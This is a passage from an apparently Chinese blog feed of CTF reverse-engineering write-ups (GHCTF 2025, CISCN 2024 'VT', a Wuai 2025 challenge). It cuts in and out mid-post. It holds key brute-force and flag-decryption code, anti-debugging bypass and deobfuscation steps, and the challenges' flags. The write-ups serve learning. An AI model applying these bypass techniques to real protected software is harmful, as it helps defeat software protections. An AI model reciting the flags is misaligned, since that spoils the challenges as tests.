class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> Key = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; Key &lt; <span class="number">0xffffffff</span>; Key++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v66 = <span class="number">0x811C9DC5</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint8_t</span> v71 = Key &gt;&gt; (i * <span class="number">8</span>);</span><br><span class="line">            <span class="type">uint32_t</span> v67&#123;&#125;;</span><br><span class="line">            <span class="keyword">if</span> (v71 % <span class="number">2</span>)</span><br><span class="line">                v67 = v66 ^ v71;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                v67 = <span class="number">16777619</span> * v66;</span><br><span class="line">            v67 = (v67 &gt;&gt; <span class="number">25</span>) | (v67) &lt;&lt; <span class="number">7</span>;</span><br><span class="line">            v66 = v67 - v71;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (v66 == <span class="number">1172912374</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%X\n&quot;</span>, Key);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>爆破得到Key：<code>8C90F77B</code></p><p>然后通过加密函数编写解密函数解密byte_F1A004数组即可得到Flag。</p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> EncFlag[]&#123;</span><br><span class="line">    <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x79</span>, <span class="number">0x9E</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0x1C</span>, <span class="number">0xDA</span>, <span class="number">0x04</span>, <span class="number">0x1D</span>,</span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0x6E</span>, <span class="number">0x80</span>, <span class="number">0x82</span>, <span class="number">0x0D</span>,</span><br><span class="line">    <span class="number">0x8A</span>, <span class="number">0x4C</span>, <span class="number">0x65</span>, <span class="number">0xE1</span>, <span class="number">0x46</span>,</span><br><span class="line">    <span class="number">0x71</span>, <span class="number">0x31</span>, <span class="number">0xED</span>, <span class="number">0xD2</span>, <span class="number">0x14</span>,</span><br><span class="line">    <span class="number">0xC5</span>, <span class="number">0x39</span>, <span class="number">0xB5</span>, <span class="number">0x49</span>, <span class="number">0xE2</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0xA9</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *Input, <span class="type">uint32_t</span> Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint8_t</span> v26 = Key &gt;&gt; <span class="number">8</span> * (<span class="number">3</span> - i % <span class="number">4</span>);</span><br><span class="line">        v26 ^= (<span class="type">uint8_t</span>)(i &amp; <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line">        Input[i] = (Input[i] - (<span class="type">uint8_t</span>)i) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        Input[i] = ((Input[i] &gt;&gt; <span class="number">3</span>) | (Input[i] &lt;&lt; <span class="number">5</span>)) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        Input[i] = Input[i] ^ v26;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> Key = <span class="number">0x8C90F77B</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Decrypt</span>(EncFlag, Key);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> v66 = <span class="number">0x811C9DC5</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint8_t</span> v71 = Key &gt;&gt; (i * <span class="number">8</span>);</span><br><span class="line">        <span class="type">uint32_t</span> v67&#123;&#125;;</span><br><span class="line">        <span class="keyword">if</span> (v71 % <span class="number">2</span>)</span><br><span class="line">            v67 = v66 ^ v71;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v67 = <span class="number">16777619</span> * v66;</span><br><span class="line">        v67 = (v67 &gt;&gt; <span class="number">25</span>) | (v67) &lt;&lt; <span class="number">7</span>;</span><br><span class="line">        v66 = v67 - v71;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        EncFlag[j] ^= <span class="number">8</span> * (v66 &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, EncFlag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag值-8"><a href="#Flag值-8" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;NSSCTF&#123;NSSCTF&#123;NSSCTF&#123;&#125;&#125;&#125;&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GHCTF-2025-Reverse-WP&quot;&gt;&lt;a href=&quot;#GHCTF-2025-Reverse-WP&quot; class=&quot;headerlink&quot; title=&quot;GHCTF 2025 Reverse WP&quot;&gt;&lt;/a&gt;GHCTF 2025 Reverse WP&lt;/</summary>
      
    
    
    
    
    <category term="CTF出题" scheme="https://tkazer.github.io/tags/CTF%E5%87%BA%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Ciscn2024-逆向0解题-VT</title>
    <link href="https://tkazer.github.io/2025/02/20/Ciscn-reverse-vt/"/>
    <id>https://tkazer.github.io/2025/02/20/Ciscn-reverse-vt/</id>
    <published>2025-02-20T15:36:15.000Z</published>
    <updated>2025-02-21T03:18:32.661Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ciscn2024-逆向0解题-VT"><a href="#Ciscn2024-逆向0解题-VT" class="headerlink" title="Ciscn2024-逆向0解题-VT"></a>Ciscn2024-逆向0解题-VT</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这题不想吐槽什么，利用开源的混淆项目将代码混淆就是一道题。由于逆向功底不够且花指令样式随机多变，只能手动去除花指令，这部分就花了一个小时左右。当时比赛时看到一坨混淆直接放弃了，现在重新做一遍发现其实花点时间其实也是可以解出的。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="程序分析-开源混淆项目"><a href="#程序分析-开源混淆项目" class="headerlink" title="程序分析&amp;开源混淆项目"></a>程序分析&amp;开源混淆项目</h3><p>首先是例常Die，发现和叠Buff一样的一系列特征。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/1.png" alt="alt text"></p><p>后续在Github上找到了这个混淆的项目（obfus.h），只是用一系列特征来伪造。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/2.png" alt="alt text"></p><p>大概阅览了一下这个混淆项目，就是利用一堆花指令和逻辑混淆处理代码，然后封装了一些常用函数。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/3.png" alt="alt text"></p><p>这个项目最新版的GetProcAddress是自己重新封装实现的，而通过dbg断点发现题目程序的GetProcAddress是可以断下来的，所以应该是某个历史版本而非最新，至少是在这个版本之前。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/4.png" alt="alt text"></p><h3 id="去除花指令"><a href="#去除花指令" class="headerlink" title="去除花指令"></a>去除花指令</h3><p>这个程序花指令含以下几种（可能没截全），大多都是常规花指令，可以直接按U，再跳过指定字节数，按C重构代码。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/5.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/6.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/7.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/8.png" alt="alt text"></p><p>然后以下是一个特殊情况的花指令，图1是花指令，图2是去花后的，需要跳过箭头处jmp的第一个0xEB字节，然后再重构代码。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/9.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/10.png" alt="alt text"></p><p>然后接下来就是重复的操作，这部分可以利用idc脚本进行一键去除，由于我做的时候为了保证去除所有花指令，就都手动操作，花了一个小时左右。</p><h3 id="去花后程序API"><a href="#去花后程序API" class="headerlink" title="去花后程序API"></a>去花后程序API</h3><p>去花重构函数过程中，可以发现有很多这样类似的函数，其实就是之前在开源混淆项目的代码中看到的那些自封装函数，就是封装起来调用系统API的一个代理函数。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/11.png" alt="alt text"></p><p>大概有这么多，和开源项目里面差不多一致，不过并没有所有api都被调用到。（红叉处是后续分析功能自命名的）</p><p><img src="/2025/02/20/Ciscn-reverse-vt/12.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/13.png" alt="alt text"></p><h3 id="Main函数分析"><a href="#Main函数分析" class="headerlink" title="Main函数分析"></a>Main函数分析</h3><p>通过start函数进入main函数，发现有反调试代码（如IsDebuggerPresent），且在以下代码段发现有通过调用GetCommandLineA获取程序运行的命令行。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/14.png" alt="alt text"></p><p>调试尝试运行后发现程序会使用到命令行运行程序附带的前两个参数。下图这部分代码就是在main函数中将第二个命令行参数通过atoi转成ProcessId进行后续操作，所以第二个参数就应该是某个进程的ID。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/15.png" alt="alt text"></p><p>在下面发现有创建线程的代码，可以看到是创建mark2函数线程（自命名的）。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/35.png" alt="alt text"></p><p>尝试带参调试，看看能不能看mark2里面做了什么。第一个参数随便填，第二个参数随便填一个进程ID（必须要正在运行的进程，如果不是真实PID则Main函数不会阻塞，而是会跳到最后调用Exit函数）。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/16.png" alt="alt text"></p><p>然后断点在Main函数开头处，使用ScyllaHide插件进行一键去反调试。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/17.png" alt="alt text"></p><p>调试运行发现没法执行到创建线程的这个代码段，看汇编段发现是这边判断ecx等于0，所以跳转走了，没有执行。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/18.png" alt="alt text"></p><p>由于不知道这边ecx需要什么条件，直接下条件断点在cmp处，将ecx设置为1，强制执行下面的创建线程代码，便可以进入mark2函数进行下一步分析。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/19.png" alt="alt text"></p><h3 id="Mark2函数分析"><a href="#Mark2函数分析" class="headerlink" title="Mark2函数分析"></a>Mark2函数分析</h3><p>发现有类似被加密的数据（以下称encFlag），部分变量名和函数已经被我重命名了。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/20.png" alt="alt text"></p><p>param1_bytes_2指针进入两层跳转过去发现，数据指向的是我们参数1字符串unhex后的字节数据，所以就可以猜测给param1_bytes_2赋值的函数就是类似unhex函数。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/21.png" alt="alt text"></p><p>然后下面encFlag赋值后进行了重赋值，利用之前的encFlag值，调用一个函数生成了一系列key值，然后用key值异或上param1_bytes_2，这边是i%2，所以就一直循环异或这两个字节，也就是我们输入的参数1进行unhex后的两个字节。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/22.png" alt="alt text"></p><p>由于encFlag之前的值是固定的，所以生成的一系列Key也是固定的，可以直接利用条件断点在给Key赋值的地方将他输出。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/23.png" alt="alt text"></p><p>得到以下Key值列表。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/24.png" alt="alt text"></p><p>在encFlag重赋值下面，调用了一个计算call传入encFlag，计算返回一个4字节数值。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/25.png" alt="alt text"></p><p>且在下面部分可以看到对v22做了一个判断，判断是否为0xF703DF16，若不是，则会执行到这个return直接返回，不会继续执行下面部分代码。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/26.png" alt="alt text"></p><p>在下面未执行代码中看到了类似对encFlag进行解密的函数Call，并且在下面看到了判断解密后数据结尾是否是为’}’，如果是就break。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/27.png" alt="alt text"></p><p>且在最底下代码看到一个printf函数的调用，输出了解密后的字符串。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/28.png" alt="alt text"></p><h3 id="程序流程总结"><a href="#程序流程总结" class="headerlink" title="程序流程总结"></a>程序流程总结</h3><ol><li><p>首先要带两个参数运行程序，第一个参数是4长度字符串，第二个参数是一个正在运行的某个进程ID。</p></li><li><p>满足某个条件创建线程执行mark2函数进行函数主解密流程。</p></li><li><p>将第一个参数进行unhex，转成2字节数据，与固定异或列表进行一次异或计算，再调用一个计算call得到一个4字节数据，并且必须是0xF703DF16。</p></li><li><p>将通过参数1处理后的加密数据进行解密得到flag，然后printf输出。</p></li></ol><p>所以最主要是就是分析calc函数，用代码模拟calc函数进行爆破，得到密钥，也就是参数一那两个字节，接下来就分析calc函数。</p><h3 id="calc函数分析"><a href="#calc函数分析" class="headerlink" title="calc函数分析"></a>calc函数分析</h3><p>从上文可以知道calc函数第一个参数传入一个48长度字节数组，第二个参数是48，那么第二个参数应该就是输入数据的长度。</p><p>通过动调走一遍流程，确定关键计算代码，忽略其他的逻辑混淆。</p><p>最外层是通过len进行一次数据遍历，内层是进行8次的循环。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/29.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/30.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/31.png" alt="alt text"></p><p>可以用c++重写出原始的calc函数代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">calc</span><span class="params">(<span class="type">uint8_t</span>* data, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> ret_value = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> count = <span class="number">0</span>; count &lt; len; count++)</span><br><span class="line">&#123;</span><br><span class="line">ret_value ^= data[count];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ret_value &amp; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">ret_value = (ret_value &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ret_value &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ~ret_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="爆破密钥（参数一）"><a href="#爆破密钥（参数一）" class="headerlink" title="爆破密钥（参数一）"></a>爆破密钥（参数一）</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">calc</span><span class="params">(<span class="type">uint8_t</span>* data, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> ret_value = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> count = <span class="number">0</span>; count &lt; len; count++)</span><br><span class="line">&#123;</span><br><span class="line">ret_value ^= data[count];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ret_value &amp; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">ret_value = (ret_value &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ret_value &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ~ret_value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">short</span> Param1 = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 爆破2字节</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xffff</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">Param1 = i;</span><br><span class="line">        <span class="comment">// ida条件断点得到的key值列表</span></span><br><span class="line"><span class="type">uint8_t</span> KeyList[]&#123;</span><br><span class="line"><span class="number">82</span>,<span class="number">225</span>,<span class="number">68</span>,<span class="number">226</span>,<span class="number">57</span>,<span class="number">225</span>,<span class="number">94</span>,<span class="number">155</span>,<span class="number">81</span>,<span class="number">220</span>,</span><br><span class="line"><span class="number">25</span>,<span class="number">152</span>,<span class="number">80</span>,<span class="number">146</span>,<span class="number">57</span>,<span class="number">193</span>,<span class="number">80</span>,<span class="number">158</span>,<span class="number">82</span>,<span class="number">130</span>,</span><br><span class="line"><span class="number">39</span>,<span class="number">130</span>,<span class="number">38</span>,<span class="number">231</span>,<span class="number">83</span>,<span class="number">128</span>,<span class="number">36</span>,<span class="number">128</span>,<span class="number">66</span>,<span class="number">220</span>,</span><br><span class="line"><span class="number">57</span>,<span class="number">158</span>,<span class="number">2</span>,<span class="number">148</span>,<span class="number">39</span>,<span class="number">129</span>,<span class="number">69</span>,<span class="number">131</span>,<span class="number">81</span>,<span class="number">147</span>,</span><br><span class="line"><span class="number">2</span>,<span class="number">128</span>,<span class="number">68</span>,<span class="number">129</span>,<span class="number">68</span>,<span class="number">129</span>,<span class="number">68</span>,<span class="number">129</span> &#125;;</span><br><span class="line"><span class="type">uint8_t</span> Enc[<span class="number">48</span>]&#123;&#125;;</span><br><span class="line"><span class="type">uint8_t</span>* pParam1 = (<span class="type">uint8_t</span>*)(<span class="type">uint64_t</span>)(&amp;Param1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// calc之前的异或计算</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">48</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">Enc[j] = pParam1[j % <span class="number">2</span>] ^ KeyList[j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> calc_value = <span class="built_in">calc</span>(Enc, <span class="number">48</span>);</span><br><span class="line"><span class="keyword">if</span> (calc_value == <span class="number">0xF703DF16</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Cracked:%02X%02X\n&quot;</span>, pParam1[<span class="number">0</span>], pParam1[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出”Cracked:79BC”，得到密钥为<strong>79BC</strong>。</p><h2 id="获取Flag"><a href="#获取Flag" class="headerlink" title="获取Flag"></a>获取Flag</h2><p>输入密钥和一个正在运行的进程ID，再次进行调试。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/32.png" alt="alt text"></p><p>发现可以正常走到decrypt_flag函数调用处。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/33.png" alt="alt text"></p><p>单步执行完decrypt_flag函数，跳转到flag指针处，即可看到解密后的flag。</p><p><strong>flag{MjExNTY3MzE3NTQzMjI&#x3D;}</strong></p><p><img src="/2025/02/20/Ciscn-reverse-vt/34.png" alt="alt text"></p><h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2><p>这次全流程做下来感觉其实面对复杂的混淆和花指令得有耐心去分析，耐心的动调观察数据变化以及注释关键点，这样才能更好理顺思路和理解代码流程。</p><p>这次花指令全都是手动去除，因为怕写脚本处理的花指令不完整，也就是担心去除的不完整导致程序执行错乱。现在发现其实是可以参考开源的那个混淆项目，看他用到了哪些花指令，然后结合实际汇编进行分析，应该是可以将所有花指令的情况都列出来的，然后进行一键脚本去除。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Ciscn2024-逆向0解题-VT&quot;&gt;&lt;a href=&quot;#Ciscn2024-逆向0解题-VT&quot; class=&quot;headerlink&quot; title=&quot;Ciscn2024-逆向0解题-VT&quot;&gt;&lt;/a&gt;Ciscn2024-逆向0解题-VT&lt;/h1&gt;&lt;h2 id=&quot;前</summary>
      
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/categories/CTF%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>吾爱2025-Windows逆向高级题-5</title>
    <link href="https://tkazer.github.io/2025/02/18/Wuai2025Windows5/"/>
    <id>https://tkazer.github.io/2025/02/18/Wuai2025Windows5/</id>
    <published>2025-02-18T09:32:48.000Z</published>
    <updated>2025-02-21T03:18:30.467Z</updated>
    
    <content type="html"><![CDATA[<h1 id="吾爱2025-Windows逆向高级题-5"><a href="#吾爱2025-Windows逆向高级题-5" class="headerlink" title="吾爱2025-Windows逆向高级题-5"></a>吾爱2025-Windows逆向高级题-5</h1><p>考点：异步消息执行，变种tea展开、变种MD5、时间戳、Flag分段检查</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>这一段是获取两个编辑框的内容，即uid和flag，然后flag要符合异或的那一系列条件，实际格式是flag{…}。</p><p><img src="/2025/02/18/Wuai2025Windows5/1.png" alt="alt text"></p><p>跟到这边发现有一系列函数，main_program里面的执行验证按钮后主流程，execute是main_program里面通过不同消息来执行不同命令的函数。（都是自命名的函数，仅代表个人想法）</p><p><img src="/2025/02/18/Wuai2025Windows5/2.png" alt="alt text"></p><h2 id="execute函数"><a href="#execute函数" class="headerlink" title="execute函数"></a>execute函数</h2><p>其他消息：将flag括号内数据进行unhex（如1122字符串直接转成0x11,0x22数据）</p><p>0x35消息：获取当前半小时整点时间戳数据。</p><p><img src="/2025/02/18/Wuai2025Windows5/3.png" alt="alt text"></p><p>0x55消息：通过利用变种MD5+Salt将解密完数据的前十六字节计算得到4字节数值。</p><p><img src="/2025/02/18/Wuai2025Windows5/4.png" alt="alt text"></p><p>0x25消息：unhex后数据进行解密（Decrypt函数）。</p><p><img src="/2025/02/18/Wuai2025Windows5/5.png" alt="alt text"></p><h2 id="main-program函数"><a href="#main-program函数" class="headerlink" title="main_program函数"></a>main_program函数</h2><h3 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h3><p>获取flag括号内数据通过消息分发执行execute的unhex消息，然后再执行execute的Decrypt函数，解密unhex后的数据，将解密完的数据长度赋值给v12。</p><p><img src="/2025/02/18/Wuai2025Windows5/6.png" alt="alt text"></p><h3 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h3><p>将解密完数据的前16字节进行custom_MD5，得到4字节数据，然后判断解密后数据第17个字节开始四个字节是否和计算得到的4字节数据相等。</p><p>如果相等就再次判断v12，即解密后数据长度，判断是否等于20。</p><p>再调用execute的时间戳获取消息，得到8字节时间戳数据。</p><p>最后再检查解密后数据前8字节是否等于时间戳数据，以及第九个字节往后8字节是否等于编辑框输入的uid。</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>输入的flag得是被和Decrypt相对于的加密函数进行加密后的数据，加密前格式：{半时整点时间戳（8字节），uid（8字节），Custom_MD5（前面十六字节）（4字节），0x04填充（四个字节）}</p><p>最后一部分填充会在下面Decrypt函数里面说明来由。</p><p><img src="/2025/02/18/Wuai2025Windows5/7.png" alt="alt text"></p><h2 id="Decrypt函数（sub-7FF7FAC92C40）"><a href="#Decrypt函数（sub-7FF7FAC92C40）" class="headerlink" title="Decrypt函数（sub_7FF7FAC92C40）"></a>Decrypt函数（sub_7FF7FAC92C40）</h2><p>要求unhex后数据长度要是8的倍数，且利用一系列计算得到v12这个数据，参与内部解密的Key生成，最后还要求解密完的数据符合一系列条件验证。</p><p><img src="/2025/02/18/Wuai2025Windows5/8.png" alt="alt text"></p><h3 id="解密后数据条件验证"><a href="#解密后数据条件验证" class="headerlink" title="解密后数据条件验证"></a>解密后数据条件验证</h3><p>从这部分逻辑代码可以分析，他是将最后v8指向最后一个数据，然后v9赋值最后一个数据，然后v8循环递减，直到当前v8指向v8开始往前的第v9个指针结束，然后最后解密后数据长度&#x3D;当前长度-v9。</p><p>已知解密后前面已经占用了20字节（时间戳+uid+md5），在main_program也已知解密后数据长度要等于20，所以可以知道这边v9必须等于4，所以v8等于4，最后这边一共占用4个字节，即{4,4,4,4}，这样经过这边的验证最后的size才会等于20。</p><p><img src="/2025/02/18/Wuai2025Windows5/9.png" alt="alt text"></p><h3 id="dec函数"><a href="#dec函数" class="headerlink" 